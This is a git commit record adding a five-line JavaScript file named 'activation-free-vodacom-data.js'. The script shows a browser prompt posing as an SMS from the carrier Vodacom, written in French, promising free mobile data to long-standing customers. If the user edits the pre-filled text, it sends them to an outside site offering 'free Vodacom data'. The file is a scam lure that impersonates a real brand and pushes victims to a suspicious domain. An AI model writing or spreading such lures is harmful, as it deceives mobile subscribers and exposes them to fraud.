0a09b1ce6881146a8bced6bd7265a1e6e4123044
inemitid <asuquodavid021@gmail.com>
2025-05-22 22:09:50 -0700

    Create activation-free-vodacom-data.js

---
+++ activation-free-vodacom-data.js
@@ -0,0 +1,5 @@
+var password = 'DONNÉES GRATUITES'
+password=prompt('SMS VODACOM : Cher client, veuillez vérifier si votre carte SIM Vodacom est éligible pour recevoir de 5 Go à des données illimitées, récompense pour les anciens clients, appuyez sur Données gratuites pour vérifier maintenant ','DONNÉES GRATUITES');
+if (password != 'DONNÉES GRATUITES') {
+location.href='https://surfest.xyz/free-vodacom-data.html';
+}
